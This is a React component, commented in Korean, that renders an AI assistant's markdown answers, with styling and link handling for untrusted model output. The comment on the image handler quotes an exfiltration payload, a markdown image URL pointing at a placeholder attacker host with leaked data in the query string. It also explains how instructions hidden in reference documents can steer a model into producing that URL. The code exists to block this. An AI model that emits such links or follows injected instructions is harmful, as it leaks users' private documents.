"use client";

/**
 * AI 답변 본문의 마크다운 렌더러.
 *
 * 모델은 목록·굵게·표·코드 같은 마크다운으로 답한다. 이걸 평문으로 보여 주면 `**` 와 `|` 가 그대로 찍힌다.
 * `react-markdown` 은 HTML 을 문자열로 끼워 넣지 않고 요소 트리를 만들기 때문에 모델 출력을 그대로 넣어도
 * 스크립트가 실행되지 않는다(원문의 HTML 태그는 이스케이프된다). `remark-gfm` 은 표·취소선·작업 목록을 더한다.
 *
 * 스타일은 Tailwind 클래스로 요소마다 준다. typography 플러그인을 쓰지 않는 이유는 대화 화면의 글자 크기·
 * 줄 간격이 이미 정해져 있어서, 그 안에 맞는 여백만 필요하기 때문이다.
 *
 * 스트리밍 중에는 이 컴포넌트가 잘린 문자열을 받는다. 닫히지 않은 `**` 나 표는 그 순간엔
 * 평문으로 보이다가 다음 조각이 오면 제대로 그려진다 — 마크다운 파서가 관대해서 깨지지 않는다.
 */
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

const components: Components = {
  p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
  ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
  li: ({ children }) => <li className="leading-relaxed">{children}</li>,
  h1: ({ children }) => <h3 className="mb-1.5 mt-3 text-[17px] font-bold text-slate-900">{children}</h3>,
  h2: ({ children }) => <h3 className="mb-1.5 mt-3 text-[17px] font-bold text-slate-900">{children}</h3>,
  h3: ({ children }) => <h4 className="mb-1 mt-3 text-base font-bold text-slate-900">{children}</h4>,
  h4: ({ children }) => <h5 className="mb-1 mt-2 text-base font-semibold text-slate-900">{children}</h5>,
  strong: ({ children }) => <strong className="font-semibold text-slate-900">{children}</strong>,
  a: ({ children, href }) => (
    // 모델이 만든 링크는 신뢰하지 않는다 — 새 탭 + noopener, 그리고 referrer 를 보내지 않는다
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="underline decoration-slate-300 underline-offset-2 hover:text-slate-900"
    >
      {children}
    </a>
  ),
  blockquote: ({ children }) => (
    <blockquote className="my-2 border-l-2 border-slate-300 pl-3 text-slate-600">{children}</blockquote>
  ),
  code: ({ children, className }) =>
    // 코드 블록 안의 <code> 는 pre 가 배경을 갖는다. 인라인만 칩 모양
    className ? (
      <code className="font-mono text-[13px]">{children}</code>
    ) : (
      <code className="rounded bg-slate-100 px-1.5 py-0.5 font-mono text-[13px] text-slate-800">{children}</code>
    ),
  pre: ({ children }) => (
    <pre className="thin-scroll my-2 overflow-x-auto rounded-lg bg-slate-900 px-3.5 py-3 text-[13px] leading-relaxed text-slate-100">
      {children}
    </pre>
  ),
  table: ({ children }) => (
    <div className="thin-scroll my-2 overflow-x-auto rounded-lg border border-slate-200">
      <table className="w-full border-collapse text-[14px]">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-slate-50 text-slate-600">{children}</thead>,
  th: ({ children }) => (
    <th className="border-b border-slate-200 px-3 py-1.5 text-left font-semibold whitespace-nowrap">{children}</th>
  ),
  td: ({ children }) => <td className="border-b border-slate-100 px-3 py-1.5 align-top">{children}</td>,
  hr: () => <hr className="my-3 border-slate-200" />,
  /**
   * 이미지는 그리지 않는다. `![](https://공격자/x?d=…)` 가 답변에 섞이면 브라우저가 클릭 없이 그 주소를 GET 하므로,
   * 참고 문서에 숨긴 지시로 모델을 유도해 다른 문서 내용을 쿼리스트링에 실어 보내는 유출 경로가 된다.
   * 답변에 이미지가 필요한 경우는 없고, 대신 대체 텍스트만 남긴다. CSP img-src 도 함께 제한한다(next.config.ts).
   */
  img: ({ alt }) => (
    <span className="rounded bg-slate-100 px-1.5 py-0.5 text-[13px] text-slate-500">
      [이미지 생략{alt ? `: ${alt}` : ""}]
    </span>
  ),
};

export function Markdown({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
      {text}
    </ReactMarkdown>
  );
}
